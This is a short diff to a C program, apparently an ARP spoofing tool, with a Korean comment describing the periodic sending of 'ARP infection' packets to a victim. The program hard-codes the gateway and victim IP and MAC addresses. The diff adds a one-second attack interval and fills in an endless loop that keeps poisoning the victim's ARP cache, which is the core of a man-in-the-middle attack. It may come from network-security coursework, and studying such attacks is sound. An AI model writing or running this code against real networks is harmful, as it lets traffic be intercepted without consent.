@@ -16,6 +16,8 @@ const char *gateway_mac = "90:9f:33:b3:53:c6";
 const char *victim_ip   = "192.168.0.2";
 const char *victim_mac  = "64:bc:0c:68:e5:71";
 
+const int attack_cycle  = 1; // seconds
+
 int main() {
     printf("Select the Function to be executed.\n\n");
     printf("0. program exit.\n");
@@ -203,7 +205,10 @@ void send_arp_reply_infection_packet() {
     이를 위해 주기적으로 ARP infection packet을 Victim에게 전달.
 */
 void send_arp_reply_infection_packet_loop() {
-
+    while(true) {
+        send_arp_reply_infection_packet();
+        sleep(attack_cycle);
+    }
 }
 
 /*
